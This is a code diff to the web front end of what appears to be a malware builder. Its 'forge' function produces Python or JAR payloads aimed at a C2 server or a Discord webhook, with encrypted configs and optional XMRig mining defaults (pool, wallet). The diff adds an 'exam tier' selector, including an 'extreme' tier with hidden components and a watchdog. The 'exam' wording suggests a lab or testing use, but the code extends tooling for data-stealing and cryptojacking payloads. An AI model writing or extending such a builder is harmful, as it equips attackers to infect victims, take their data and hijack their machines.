@@ -148,6 +148,14 @@ footer .sep{color:var(--line)}
       <span>encrypt config — seal target with a per-build random key</span>
     </label>
   </div>
+  <div class="switch-row" style="margin-top:8px">
+    <label class="switch-label" for="tier" style="gap:8px">exam tier
+      <select id="tier" class="switch-input" style="width:auto;padding:6px 10px">
+        <option value="lab">lab — 3 legs (bait + basics)</option>
+        <option value="extreme">extreme — + hidden legs &amp; watchdog</option>
+      </select>
+    </label>
+  </div>
   <details style="margin-top:6px">
     <summary style="cursor:pointer;font-size:11px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px">
       ⛏ miner defaults — open-source <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener" style="color:var(--cyn)">XMRig</a> (optional)
@@ -220,7 +228,7 @@ async function forge(){
   forgeBtn.disabled=true; forgeBtn.textContent='⚒️ FORGING…';
   say('forging '+(mode==='py'?'python':'jar')+'…','info');
   const v=target.value.trim();
-  const body={encrypt:enc.checked};
+  const body={encrypt:enc.checked, tier:(document.getElementById('tier')||{}).value||'lab'};
   if(/discord\.com\/api\/webhooks\//.test(v)) body.webhook=v; else body.c2=v;
   const pool=document.getElementById('mpool').value.trim(),
         wallet=document.getElementById('mwallet').value.trim(),
